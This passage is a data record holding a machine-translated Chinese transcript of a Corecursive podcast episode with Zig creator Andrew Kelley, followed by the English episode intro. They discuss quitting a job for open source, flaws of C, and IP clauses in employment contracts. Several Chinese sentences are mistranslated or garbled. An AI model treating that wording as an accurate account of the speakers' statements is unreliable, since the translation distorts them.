libc\u3002\u5b83\u9002\u7528\u4e8e\u6240\u6709 Linux\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709 libc \u4f9d\u8d56\u9879\u3002\u5b83\u53ea\u662f\u5728\u6c47\u7f16\u4e2d\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5b83\u552f\u4e00\u7684\u4f9d\u8d56\u662f\u6587\u4ef6\u7cfb\u7edf\u548c\u5185\u6838\u3002\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u5176\u4ed6\u4efb\u4f55\u4e1c\u897f\u3002\u6240\u4ee5\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5b83\u53ea\u9002\u7528\u4e8e Linux \u4e0a\u7684\u6bcf\u4e2a\u4eba\u7684\u8ba1\u7b97\u673a\uff0c\u5c31\u50cf\u5728 Windows \u548c\u5176\u4ed6\u7cfb\u7edf\u4e0a\u4e00\u6837\u3002\u6211\u4eec\u901a\u8fc7\u8d28\u7591\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u5206\u53d1\u4e8b\u7269\u5e76\u8bf4\uff1a\u201c\u597d\u5427\uff0c\u4e5f\u8bb8\u6211\u4eec\u5e94\u8be5\u8d70\u4e0d\u540c\u7684\u65b9\u5411\uff0c\u4ece\u800c\u83b7\u5f97\u4e86\u8fd9\u79cd\u597d\u5904\u3002\u201d\n\u5b89\u5fb7\u9c81\uff1a\u662f\u7684\u3002\u6211\u8ba4\u4e3a\u5b83\u786e\u5b9e\u53d6\u51b3\u4e8e glibc\u3002\u6211\u77e5\u9053\u60a8\u5b9e\u9645\u4e0a\u53ef\u4ee5\u5c06 Zig \u4e0e Go \u4e00\u8d77\u4f7f\u7528\uff0cZig \u5c06\u63d0\u4f9b\u62e5\u6709\u9759\u6001 Linux \u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u80fd\u529b\uff0c\u5e76\u4e3a\u60a8\u63d0\u4f9b Go \u7a0b\u5e8f\u7684\u8fd9\u79cd\u597d\u5904\u3002\u5b89\u5fb7\u9c81\uff1a\u4e00\u4e2a\u662f\u6709\u592a\u591a\u65b9\u6cd5\u4f1a\u610f\u5916\u5f15\u5165\u9519\u8bef\uff0c\u8fd9\u4e9b\u9519\u8bef\u4e0d\u662f\u56e0\u4e3a\u7f16\u7a0b\u56f0\u96be\u800c\u5bfc\u81f4\u7684\u6709\u8da3\u9519\u8bef\uff0c\u4f46\u5b83\u4eec\u662f\u4e0d\u5fc5\u8981\u7684\u9519\u8bef\uff0c\u56e0\u4e3a C \u7f16\u7a0b\u8bed\u8a00\u505a\u51fa\u4e86\u4e00\u4e9b\u9519\u8bef\u7684\u51b3\u5b9a\u3002\u6240\u4ee5\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6709\u4e00\u4e2a\u7c7b\u578b\u7cfb\u7edf\uff0c\u4e00\u4e2a\u7c7b\u578b\u7cfb\u7edf\u7684\u5168\u90e8\u610f\u4e49\u662f\u5e2e\u52a9\u4f60\u4e0d\u72af\u9519\u8bef\uff0c\u4f46\u662f\u7c7b\u578b\u7cfb\u7edf\u6709\u4e00\u4e9b\u5b83\u5141\u8bb8\u6ca1\u6709\u9519\u8bef\u548c\u8b66\u544a\u7684\u4e1c\u897f\uff0c\u8fd9\u4e9b\u4e1c\u897f\u53ea\u662f\u9519\u8bef\u7684 99%\u65f6\u95f4\u3002\u5f88\u5bb9\u6613\u72af\u8fd9\u4e2a\u9519\u8bef\u3002\u50cf\u6574\u6570\u8f6c\u6362\u89c4\u5219\u8fd9\u6837\u7684\u4e1c\u897f\u5c31\u662f\u5176\u4e2d\u4e4b\u4e00\uff0c\u6240\u4ee5\u8fd9\u662f\u6211\u4f1a\u63d0\u51fa\u7684\u4e00\u79cd\u62b1\u6028\u3002\u592a\u5bb9\u6613\u5c04\u4e2d\u81ea\u5df1\u7684\u811a\u4e86\u3002\u7136\u540e\uff0c\u8fdb\u884c\u4e0d\u5fc5\u8981\u7684\u590d\u6742\u8c03\u8bd5\u4f1a\u8bdd\u6765\u89e3\u51b3\u95ee\u9898\u3002\u5b89\u5fb7\u9c81\uff1a\u7136\u540e\uff0c\u6211\u8981\u63d0\u51fa\u7684\u7b2c\u4e8c\u4e2a\u62b1\u6028\u662f\uff0c\u867d\u7136 C \u4ee3\u7801\u901a\u5e38\u5f88\u5bb9\u6613\u9605\u8bfb\uff0c\u56e0\u4e3a\u5b83\u53ea\u662f\u51fd\u6570\u548c\u6570\u636e\u3002\u8fd9\u662f\u6700\u597d\u7684\u60c5\u51b5\u3002\u5b83\u4e0a\u9762\u786e\u5b9e\u53ea\u6709\u53e6\u4e00\u79cd\u4e0d\u540c\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u5373 C \u9884\u5904\u7406\u5668\u3002\u5b83\u4e0d\u662f C\uff0c\u5b83\u662f\u4e00\u79cd\u57fa\u4e8e\u6587\u672c\u8fde\u63a5\u7684\u4e0d\u540c\u8bed\u8a00\uff0c\u4eba\u4eec\u8fc7\u5ea6\u6ee5\u7528\u8be5\u8bed\u8a00\u3002\u7136\u540e\uff0c\u5f88\u96be\u5f04\u6e05\u695a\u53d1\u751f\u4e86\u4ec0\u4e48\u3002\u4f60\u770b\u5230\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u5b83\u662f\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u5417\uff1f\u5982\u679c\u60a8\u5bf9\u6b63\u5728\u9605\u8bfb\u7684\u4ee3\u7801\u4e0d\u662f\u5f88\u719f\u6089\uff0c\u60a8\u603b\u662f\u60f3\u77e5\u9053\uff0c\u201c\u8fd9\u662f\u4e00\u4e2a\u5b8f\u5417\uff1f\u8fd9\u53ef\u80fd\u662f\u4e00\u4e2a\u5b8f\u3002\u201d\u5bf9\uff1f\u5b89\u5fb7\u9c81\uff1a\u5168\u7403\u77e5\u8bc6\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u8868\u8fbe\u65b9\u5f0f\u3002\u662f\u7684\u3002\u6211\u4f7f\u7528 Zig \u8bed\u8a00\u6240\u505a\u7684\u91cd\u8981\u8bbe\u8ba1\u8003\u8651\u4e4b\u4e00\u662f\u8ba9\u6211\u4eec\u51cf\u5c11\u4eba\u4eec\u5728\u9605\u8bfb\u4ee3\u7801\u65f6\u5fc5\u987b\u8bb0\u4f4f\u7684\u6570\u91cf\u3002\u5b89\u5fb7\u9c81\uff1a\u6709\u4e9b\u4eba\u5bf9\u4eba\u4eec\u5f7c\u6b64\u523b\u8584\u7684\u89c4\u8303\u975e\u5e38\u9632\u5fa1\u3002\u4e0d\u8981\u8bef\u4f1a\u6211\u7684\u610f\u601d\uff0c\u6211\u662f\u4e00\u4e2a\u975e\u5e38\u76f4\u7387\u7684\u4eba\u3002\u6211\u5bf9\u51b2\u7a81\u611f\u5230\u5f88\u8212\u670d\uff0c\u6211\u53ef\u4ee5\u544a\u8bc9\u522b\u4eba\u6211\u8ba4\u4e3a\u4ed6\u4eec\u5145\u6ee1\u4e86\u72d7\u5c4e\uff0c\u4f46\u662f\u4f60\u6709\u6ca1\u6709\u8fdb\u5165 C\u3001freenode \u9891\u9053\u5e76\u53ea\u662f\u89c2\u5bdf\uff1f\n\u5b89\u5fb7\u9c81\uff1a\u90a3\u662f\u6211\u53bb\u8fc7\u7684\u6700\u6bd2\u3001\u6700\u654c\u5bf9\u7684\u804a\u5929\u5ba4\u4e4b\u4e00\u3002\u5728 freenode \u620f\u5267\u4e4b\u524d\uff0cfreenode \u4e0a\u7684 C \u7f16\u7a0b\u8bed\u8a00\u9891\u9053\u3002\u4f60\u53ef\u4ee5\u8fdb\u53bb\u95ee\u4e00\u4e9b\u7b80\u5355\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u201c\u6211\u600e\u4e48\u2026\u2026\u6211\u4e0d\u77e5\u9053\u3002\u6211\u5982\u4f55\u5bf9\u9f50\u7ed3\u6784\u4f53\u6216\u5176\u4ed6\u4e1c\u897f\u4e2d\u7684\u5b57\u6bb5\uff1f\u201d\u4e00\u4e9b\u975e\u5e38\u5408\u7406\u7684\u95ee\u9898\uff0c\u4f60\u4f1a\u5f97\u5230\u4e00\u4e2a\u53eb\u4f60\u540d\u5b57\u7684\u4eba\uff0c\u4e00\u4e2a\u8bf4\u4f60\u4e0d\u80fd\u7ecf\u671f\u7684\u4eba\uff0c\u88ab\u52a8\u653b\u51fb\u6839\u672c\u65e0\u6cd5\u89e3\u91ca\u3002\u4e00\u4e2a\u4eba\u7ed9\u4e86\u4f60\u9519\u8bef\u7684\u4fe1\u606f\uff0c\u800c\u5b9e\u9645\u7684\u7b54\u6848\u662f\u4f60\u53ef\u4ee5\u505a\u5230\u3002\u6ca1\u5173\u7cfb\u3002\u8fd8\u6709\u4e00\u4e9b\u4f60\u53ef\u4ee5\u505a\u7684\u6280\u5de7\u3002\u8fd9\u662f\u4e16\u754c\u4e0a\u6700\u7cdf\u7cd5\u7684\u5730\u65b9\u4e4b\u4e00\u3002\u6211\u4e0d\u77e5\u9053\u90a3\u662f\u600e\u4e48\u56de\u4e8b\u3002\u6240\u4ee5\uff0c\u5c31\u50cf\u6211\u7528\u6765\u5f62\u5bb9\u5b83\u7684\u4e00\u4e2a\u8bcd\u662f\u8fc2\u8150\uff0c\u5bf9\u5427\uff1f\u5b89\u5fb7\u9c81\uff1a\u4ed6\u4eec\u751a\u81f3\u6709\uff0c\u751a\u81f3\u6709\u4e00\u4e2a\u6807\u5fd7\u548c\u4e00\u4e2a\u8fc2\u8150\u7684C\u7f16\u8bd1\u5668\u3002\u6211\u603b\u662f\u60f3\uff0c\u201c\u54e6\uff0c\u8fd9\u662f C \u804a\u5929\u5ba4\u7684\u6807\u5fd7\u3002\u201d\u4e9a\u5f53\uff1a\u8003\u8651\u5230\u66f4\u597d\u7684\u8bed\u8a00\u548c\u66f4\u597d\u7684\u4e0d\u90a3\u4e48\u8fc2\u8150\u7684\u793e\u533a\u4ee5\u53ca\u5728 GitHub \u4e0a\u53d1\u5e03\u8be5\u8bed\u8a00\u7684\u5de5\u4f5c\u7248\u672c\u8fd9\u4e00\u613f\u666f\uff0c\u5b89\u5fb7\u9c81\u5f00\u59cb\u83b7\u5f97\u4e00\u4e9b\u7528\u6237\u3002\u5b89\u5fb7\u9c81\uff1a\u6bcf\u5468\u63d0\u4ea4\u95ee\u9898\u7684\u4eba\u6570\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u6162\u6162\u589e\u52a0\u3002\u60f3\u8981\u63d0\u4f9b\u5e2e\u52a9\u7684\u4eba\u6570\uff0c\u63d0\u4ea4\u62c9\u53d6\u8bf7\u6c42\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u53ef\u4f9b\u62a2\u593a\u3002\u5b83\u603b\u662f\u5728\u516c\u5f00\u573a\u5408\u8fdb\u884c\u3002\u5b83\u53ea\u662f\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u6162\u6162\u4e0a\u5347\u3002\u6211\u770b\u5230\u6709\u4eba\u7528 Zig \u505a\u7684\u7b2c\u4e00\u4e2a\u9879\u76ee\u662f Pokemon rom randomizer \u9879\u76ee\u3002\u56e0\u6b64\uff0c\u4ed6\u4eec\u4f7f\u7528 Zig \u5e76\u5236\u4f5c\u4e86\u4e00\u7ec4\u547d\u4ee4\u884c\u5de5\u5177\u6765\u83b7\u53d6\u5c5e\u4e8e Pokemon \u7684 Game Boy rom\uff0c\u5e76\u8fdb\u884c\u4e86\u4e00\u4e9b rom \u9ed1\u5ba2\u653b\u51fb\u3002\u7136\u540e\uff0c\u7ed9\u4f60\u4e00\u4e2a\u65b0\u7684 rom\uff0c\u4f60\u53ef\u4ee5\u5c06\u5b83\u5f39\u51fa\u5230\u6a21\u62df\u5668\u4e2d\uff0c\u5b83\u4f1a\u5728\u6240\u6709\u56fe\u5f62\u4e2d\u968f\u673a\u64ad\u653e\u54ea\u4e9b Pokemon \u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Adam\uff1a\u6784\u5efa\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\u9700\u8981\u5927\u91cf\u7684\u5de5\u4f5c\u3002\u4f60\u5fc5\u987b\u627e\u65f6\u95f4\u7ee7\u7eed\u63a8\u52a8\u5b83\u3002\n\u5b89\u5fb7\u9c81\uff1a\u6211\u4f1a\u628a Zig \u63cf\u8ff0\u4e3a\u5728\u6211\u804c\u4e1a\u751f\u6daf\u7684\u6df7\u51dd\u571f\u88c2\u7f1d\u4e2d\u751f\u957f\u7684\u4e00\u6735\u82b1\u3002\u5f53\u6211\u5f00\u59cb\u5b83\u65f6\uff0c\u6211\u6b63\u5728\u4ece\u5168\u804c\u5de5\u4f5c\u4e2d\u4f11\u606f\u4e00\u4e0b\u3002\u7136\u540e\uff0c\u6211\u9700\u8981\u4e00\u4efd\u5de5\u4f5c\u3002\u6240\u4ee5\uff0c\u6211\u5728\u4e00\u5bb6\u540d\u4e3a Backtrace \u7684\u521d\u521b\u516c\u53f8\u627e\u5230\u4e86\u4e00\u4efd\u5de5\u4f5c\uff0c\u505a\u4e86\u4e00\u70b9\u5de5\u4f5c\uff0c\u8282\u7701\u4e86\u66f4\u591a\u7684\u94b1\uff0c\u7136\u540e\u8f9e\u804c\uff0c\u5728 Zig \u4e0a\u5168\u804c\u5de5\u4f5c\u4e86\u51e0\u4e2a\u6708\u3002\u6211\u91c7\u8bbf\u4e86 Apple\uff0c\u4ed6\u4eec\u53ea\u662f\u76f4\u622a\u4e86\u5f53\u5730\u8bf4\uff0c\u201c\u4f60\u53ef\u80fd\u4e0d\u4f1a\u5728\u4e1a\u4f59\u65f6\u95f4\u8fd9\u6837\u505a\u3002\u201d\u6240\u4ee5\uff0c\u6211\u8bf4\uff0c\u201c\u90a3\u4f60\u6eda\u86cb\u5427\u3002\u201d\u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u73b0\u5728\u4ece Apple \u90a3\u91cc\u83b7\u5f97\u4e86\u5bf9 Zig \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u6350\u6b3e\u3002\u4e9a\u5f53\uff1a\u6709\u8fc7\u7d27\u5f20\u5417\uff1f\u6211\u60f3\u4f60\u5728 OKCupid \u6216\u5176\u4ed6\u5730\u65b9\u3002\u6211\u4e0d\u77e5\u9053\uff0c\u662f\u5de5\u4f5c\u5728\u589e\u52a0\u8fd8\u662f\u6709\u4ec0\u4e48\u4e8b\u60c5\u8981\u505a\uff1f\u4f60\u662f\u5426\u4e00\u76f4\u8bd5\u56fe\u5411\u4f60\u7684\u540c\u4e8b\u5ba3\u4f20\u4f60\u7684\u8bed\u8a00\u6709\u591a\u68d2\uff0c\u76f4\u5230\u4ed6\u4eec\u751f\u6c14\uff1f\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\u5b89\u5fb7\u9c81\uff1a\u54e6\uff0c\u662f\u7684\u3002\u5f53\u6211\u52a0\u5165OKCupid\u65f6\uff0c\u6211\u4e0d\u5f97\u4e0d\u4e0e\u62db\u8058\u4eba\u5458\u8fdb\u884c\u5168\u9762\u8c08\u5224\uff0c\u56e0\u4e3a\u5f88\u591a\u516c\u53f8\u53ea\u662f\u5728\u5408\u540c\u4e2d\u5199\u4e0b\u201c\u4f60\u4e1a\u4f59\u65f6\u95f4\u505a\u7684\u4efb\u4f55\u4e8b\u60c5\u90fd\u662f\u62e5\u6709\u7684\uff0cIP\u5f52\u516c\u53f8\u6240\u6709\u201d\u3002\u8fd9\u5f88\u8352\u8c2c\u3002\u6240\u4ee5\uff0c\u6211\u53ea\u662f\u8bf4\uff0c\u201c\u4f60\u5fc5\u987b\u4ece\u5408\u540c\u4e2d\u5220\u9664\u8fd9\u4e00\u70b9\u3002\u6211\u5c06\u62e5\u6709\u6211\u5728\u4e1a\u4f59\u65f6\u95f4\u5728\u81ea\u5df1\u7684\u8bbe\u5907\u4e0a\u6240\u505a\u7684\u4e00\u5207\u7684\u6240\u6709 IP\u3002\u201d\u90a3\u5bb6\u4f19\u5c31\u50cf\uff0c\u201c\u54e6\uff0c\u6ca1\u6709\u4eba\u8981\u8fd9\u4e2a\u3002\u6211\u4eec\u901a\u5e38\u4e0d\u4f1a\u8fd9\u6837\u505a\u3002\u6211\u4f1a\u770b\u770b\u6211\u80fd\u505a\u4ec0\u4e48\u3002\u201d\u6211\u4e0d\u5f97\u4e0d\u5bf9\u4ed6\u91c7\u53d6\u771f\u6b63\u7684\u5f3a\u786c\u7acb\u573a\uff0c\u6700\u7ec8\u4ed6\u5c48\u670d\u4e86\u3002\u4f60\u5fc5\u987b\u4fdd\u62a4\u4f60\u7684\u5b69\u5b50\uff0c\u5426\u5219\u6709\u4eba\u4f1a\u628a\u5b83\u5e26\u8d70\u3002\u4e9a\u5f53\uff1a\u662f\u7684\u3002\u8fd9\u5f88\u611a\u8822\uff0c\u5bf9\u5427\uff1f\u800c\u4e14\u4f60\u77e5\u9053\u4ed6\u4eec\u51fb\u4e2d\u5b83\u6ca1\u6709\u95ee\u9898\uff0c\u53ea\u662f\u4ed6\u4eec\u4e0d\u60f3\u7ecf\u5386\u7c7b\u4f3c\u7684\u95ee\u9898\u2026\u2026\u4ed6\u4e0d\u60f3\u627e\u51fa\u5411\u8c01\u8be2\u95ee\u8fd9\u4e2a\u95ee\u9898\u3002\u4e9a\u5f53\uff1a\u4f46\u662f\u4f60\u7684\u5b9e\u9645\u540c\u4e8b\u5462\uff0c\u4ed6\u4eec\u77e5\u9053\u4f60\u5728\u5f00\u53d1 Zig \u5417\uff1f\u4f60\u8c08\u8fc7\u5417\uff1f\n\u5b89\u5fb7\u9c81\uff1a\u54e6\uff0c\u662f\u7684\u3002\u6211\u5e76\u4e0d\u5bb3\u7f9e\u3002\u6211\u5c3d\u91cf\u4e0d\u60f9\u4eba\u8ba8\u538c\uff0c\u4f46\u6211\u65e0\u80fd\u4e3a\u529b\uff0c\u5982\u679c\u6211\u4eec...\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u7f16\u5199\uff0c\u8fd9\u4e2a\u95ee\u9898\u5c06\u662f\u4e00\u4e2a\u7f16\u8bd1\u5668\u9519\u8bef\u800c\u4e0d\u662f\u4e00\u4e2a\u9519\u8bef\u3002\u201d\u5728\u67d0\u4e9b\u65b9\u9762\uff0c\u6211\u8ba4\u4e3a\u5b83\u5e2e\u52a9\u6211\u8bbe\u8ba1\u4e86\u7f16\u8bd1\u5668\u9519\u8bef\uff0c\u56e0\u4e3a\u6211\u53ea\u662f\u770b\u5230\u4e86\u6211\u4eec\u5728\u5b9e\u8df5\u4e2d\u9047\u5230\u7684\u95ee\u9898\u3002\u4e9a\u5f53\uff1a\u6211\u6709\u70b9\u51fa\u4e4e\u610f\u6599\u7684\u662f\u5b83\u4f1a\u662f C++\u3002\u6211\u53ea\u662f\u5047\u8bbe\u6240\u6709\u559c\u6b22 SaaS \u7684\u4e1c\u897f\uff0c\u6211\u4e0d\u77e5\u9053\uff0c\u800c\u4e0d\u662f C++\u3002\u5b89\u5fb7\u9c81\uff1a\u662f\u7684\u3002\u6240\u4ee5\uff0c\u6709\u8da3\u7684\u6545\u4e8b\u662f\uff0c\u6211\u4e0d\u77e5\u9053\u8fd9\u5bb6\u516c\u53f8\u662f 15 \u5e74\u524d\u7531 Maxwell Krohn \u548c\u53e6\u4e00\u4e2a\u4eba\u7684\u540d\u5b57\u521b\u7acb\u7684\u3002\u4ed6\u4eec\u7684\u535a\u58eb\u8bba\u6587\u88ab\u79f0\u4e3a OK Web Server\u3002\u5b83\u5c31\u50cf\u4e00\u4e9b......\u5b83\u4e0e\u7ea6\u4f1a\u65e0\u5173\u3002\u8fd9\u53ea\u662f\u5728 C++ Web \u670d\u52a1\u4e0a\u5b9e\u73b0\u5b89\u5168\u6027\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u6240\u4ee5\uff0c\u57fa\u672c\u4e0a\u4ed6\u4eec\u505a\u4e86\u7814\u7a76\uff0c\u7136\u540e\u4ed6\u4eec\u60f3\uff0c\u201c\u597d\u5427\uff0c\u73b0\u5728\u600e\u4e48\u529e\uff1f\u6211\u60f3\u6211\u4eec\u4f1a\u5f00\u4e00\u5bb6\u516c\u53f8\u3002\u201d\u4e9a\u5f53\uff1a\u662f\u7684\u3002\u6240\u4ee5\uff0c\u4ed6\u4eec\u4f7f\u7528 C++ \u5c31\u50cf\u4efb\u610f\u7684\u3002\u597d\u5427\uff0c\u4ed6\u4eec\u9009\u62e9\u7ea6\u4f1a\u5b9e\u9645\u4e0a\u662f\u4efb\u610f\u7684\u3002\u4e9a\u5f53\uff1a\u662f\u7684\u3002\u5b83\u603b\u662f\u4f1a\u662f C++\u3002\u4ed6\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u3002\u5b89\u5fb7\u9c81\uff1a\u6709\u8da3\u7684\u662f\uff0c\u5f53\u4f60\u52a0\u5165\u516c\u53f8\u65f6\uff0c\u4ed6\u4eec\u53ea\u662f\u8ba9\u4f60\u9605\u8bfb\u8bba\u6587\uff0c\u56e0\u4e3a\u5b83\u4ecd\u7136\u51c6\u786e\u5730\u8bf4\u660e\u4e86\u4ee3\u7801\u5e93\u7684\u5de5\u4f5c\u539f\u7406\u3002\n\u4e9a\u5f53\uff1a\u6211\u7684\u610f\u601d\u662f\u5728\u67d0\u4e9b\u65b9\u9762\u8fd9\u5f88\u68d2\uff0c\u56e0\u4e3a\u5c31\u50cf\u5927\u591a\u6570\u5730\u65b9\u90fd\u6709\u4ee3\u7801\u5e93\u4e00\u6837\uff0c\u6ca1\u6709\u4e00\u4e2a\u4eba\u53ef\u4ee5\u89e3\u91ca\u5b83\u7684\u5168\u90e8\u5185\u5bb9\uff0c\u5bf9\u5427\uff1f\u5b89\u5fb7\u9c81\uff1a\u662f\u7684\u3002\u6211\u540c\u610f\u4f60\u7684\u770b\u6cd5\uff0c\u867d\u7136\u6211\u4f1a\u8bf4\u53ea\u662f\u6d4f\u89c8\u4e86\u4e00\u5806\u65e7\u4ee3\u7801\uff0c\u4f46\u6211\u53ef\u4ee5\u8bf4\u521b\u59cb\u4eba\u53ea\u662f\u73a9\u5f97\u5f88\u200b\u200b\u5f00\u5fc3\uff0c\u53ea\u662f\u5c1d\u8bd5\u4e86\u5f88\u591a\uff0c\u53ea\u662f\u73a9\u73a9\u4e1c\u897f\u3002\u6211\u53ea\u662f\u60f3\uff0c\u201c\u8c01\u5728\u4e4e\uff1f\u6211\u4eec\u80af\u5b9a\u4f1a\u9000\u51fa\u521b\u4e1a\u516c\u53f8\u5e76\u5728\u56db\u5e74\u540e\u79bb\u5f00\u3002\u6211\u4e0d\u5c51\u4e00\u987e\u3002\u201d\u5bf9\uff1f\u4f60\u53ef\u4ee5\u5728\u4ed6\u4eec\u7684\u4ee3\u7801\u4e2d\u770b\u5230\u5b83\u3002\u4f60\u53ef\u4ee5\u8bf4\u4ed6\u4eec\u53ea\u662f\u5728\u80e1\u95f9\uff0c\u4ed6\u4eec\u771f\u7684\u4e0d\u5728\u4e4e\u2026\u2026\u8fd9\u5f88\u6f02\u4eae\u2026\u2026\u6211\u89c9\u5f97\u6211\u548c\u521b\u59cb\u4eba\u4e4b\u95f4\u6709\u4e00\u79cd\u8d85\u793e\u4f1a\u7684\u5173\u7cfb\u3002\u6211\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4e0e\u4ed6\u4eec\u4e92\u52a8\uff0c\u4f46\u6211\u4e0e\u4ed6\u4eec\u7684\u4ee3\u7801\u4e92\u52a8\u3002\u800c\u6211\u5c31\u50cf\u2026\u2026 Adam\uff1a\u662f\u7684\u3002\u4ec0\u4e48\u6211\u4e0d\u5728\u4e4e\uff0c\u6211\u8981\u50cf C++ \u90a3\u6837\u9000\u51fa\uff1f\u5b89\u5fb7\u9c81\uff1a\u6709\u4e00\u4e2a\u6587\u4ef6\u65e2\u662f Perl \u811a\u672c\u53c8\u662f C++ \u6587\u4ef6\uff0c\u8981\u66f4\u65b0\u5b83\u2026\u2026\u5b83\u662f\u81ea\u6211\u66f4\u65b0\u7684\uff0c\u6240\u4ee5\u4f60\u7528 Perl \u8fd0\u884c\u5b83\uff0c\u5b83\u4f1a\u81ea\u6211\u7f16\u8f91\uff0c\u4f46\u662f\u4f60\u5e94\u8be5\u2026\u2026\u5b83\u662f\u7528\u4e8e C++\u9879\u76ee\u3002\u90a3\u6709\u610f\u4e49\u5417\uff1f\u8fd9\u662f\u4e00\u4e2a\u591a\u8bed\u8a00\u6587\u4ef6\u3002\u5b89\u5fb7\u9c81\uff1a\u6240\u4ee5\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u662f\u4e00\u4e2a Perl \u7a0b\u5e8f\uff0c\u5b83\u50cf\u4e00\u4e2a\u5947\u602a\u7684\u9ed1\u5ba2\u4e00\u6837\u7f16\u8f91\u81ea\u5df1\uff0c\u8fd9\u6837\u5b83\u5c31\u53ef\u4ee5\u88ab\u4e24\u8005\u89e3\u6790\u3002\u4e9a\u5f53\uff1a\u5728\u4f60\u6210\u4e3a\u5168\u804c\u4e4b\u524d\uff0c\u4f60\u6709\u6ca1\u6709\u89c9\u5f97\u505a\u8fd9\u4e2a\u548c\u6211\u7684\u5de5\u4f5c\u592a\u8fc7\u5206\u4e86\uff1f\n\u5b89\u5fb7\u9c81\uff1a\u54e6\uff0c\u6211\u80af\u5b9a\u538b\u529b\u5f88\u5927\u3002\u662f\u7684\u3002\u6211\u7684\u672a\u5a5a\u59bb\u53ef\u4ee5\u544a\u8bc9\u4f60\u4e00\u4e9b\u65f6\u5019\u6211\u53ea\u662f\u8868\u73b0\u5f97\u975e\u5e38\u975e\u5e38\u6709\u538b\u529b\uff0c\u5c31\u50cf\u65e0\u6cd5\u6210\u4e3a\u4e00\u4e2a\u597d\u4f19\u4f34\u4e00\u6837\uff0c\u4f46\u6211\u4ec0\u81f3\u4ece\u672a\u8003\u8651\u8fc7\u653e\u5f03\u505a Zig \u7684\u4e8b\u60c5\u3002\u6211\u552f\u4e00\u8003\u8651\u8fc7\u7684\u5c31\u662f\u8f9e\u804c\u3002\u7ed9\u6211\u5e26\u6765\u5982\u6b64\u5927\u538b\u529b\u7684\u4e8b\u60c5\u662f\u611f\u89c9\u6211\u53ea\u662f\u5728\u8fd9\u4e9b\u5e9f\u8bdd\u4e0a\u6d6a\u8d39\u6211\u7684\u751f\u547d\u3002\u6d6a\u8d39\u6211\u7684\u751f\u547d\u53ea\u662f\u4e3a\u4e86\u8d5a\u94b1\u800c\u6210\u4e3a\u522b\u4eba\u6e38\u620f\u4e2d\u7684\u68cb\u5b50\uff0c\u800c\u6211\u89c9\u5f97\u6211\u5728\u8fd9\u4e2a\u5f00\u6e90\u9879\u76ee\u4e2d\u6240\u505a\u7684\u4e8b\u60c5\u66f4\u6709\u610f\u4e49\u3002\u6211\u7684\u610f\u601d\u662f\u6211\u4eec\u5728\u751f\u6d3b\u4e2d\u521b\u9020\u81ea\u5df1\u7684\u610f\u4e49\u3002\u6211\u4e0d\u662f\u5728\u8fd9\u91cc\u5224\u65ad\u4efb\u4f55\u4eba\u60f3\u7528\u4ed6\u4eec\u7684\u751f\u6d3b\u505a\u4ec0\u4e48\uff0c\u5982\u679c\u4f60\u60f3\u8d5a\u94b1\u5c31\u53bb\u8d5a\u94b1\uff0c\u4f46\u6211\u4e0d\u60f3\u6210\u4e3a\u4f60\u8d5a\u94b1\u7b56\u7565\u7684\u68cb\u5b50\u3002\u6211\u60f3\u8981\u505a ......", "note_en": "Today\u2019s show: How to quit your job and work on open source full time.\n This story has it all \u2013 balancing side projects and full-time employment, building up enough supports to leave your job, and explaining quitting to your family and friends.\n And also: what do you do if your project succeeds, and then someone forks it and builds a commercial business around it? And how do you deal with hacker news feedback? And how can we improve on the C programming language?\n  Subscribe here\n Note: This podcast is designed to be heard. If you are able, we strongly encourage you to listen to theaudio, which includes emphasis that\u2019s not on the page Andrew:Let me be clear about this. Commercially forking Zig is fine. It\u2019s MIT-licensed like go for it. But what they did with the Fork was be very tricky about it, right? So, they actually deleted the license file, put their own license in it and made it look like you had to pay for the software. So, they were deceiving people. That was the problem with what they were doing.\n Adam:Hello, and welcome to Corecursive. I\u2019m Adam Gordon Bell. Each episode someone shares the story of a piece of software being built. Today\u2019s show, How to Quit Your Job and Work on Open Source Full Time. This story has it all, balancing open source work and full-time employment, building up enough supporters and enough savings to leave your job. The hardest part to me which is explaining leaving your job to your significant other and to your family and friends.\n And then, also what do you do if your project succeeds, and then someone forks it and builds a commercial business around it? There\u2019s a lot more as well dealing with hacker news feedback, how to improve upon the C programming language and how to be super ambitious without seeming arrogant. And my guest is this guy.\n Andrew:My name is Andrew Kelly. I am the lead software developer and president of the Zig Software Foundation.\n  Adam:Zig is a programming language, and we\u2019ll get into why it\u2019s needed, but Andrew got started on Zig because of another side project.\n Andrew:I started working on a music studio project, and in this music studio project, you have more difficult requirements than you usually have in other programming projects. So, for example, if anyone\u2019s going to use your music studio software live, for live performance, you have a hot loop where you absolutely must not skip the audio or their entire performance might be compromised.\n So, you just have these like new constraints where you really need control over how it\u2019s going to work. And likewise, if you want to support all the hardware that\u2019s associated with this, a lot of times you\u2019re not going to be able to rely on someone else\u2019s third-party library to do that for you, you\u2019re going to have to get into OC, C++ or another low-level language that gives you the control that you need and the other thing I noticed is that when I tried to use other people\u2019s libraries, if I ran into a problem, I wouldn\u2019t be able to fix it. It\u2019s too slow.\n I\u2019m trying to make progress on this big project and I learned the value of inventing stuff here, right? People are always 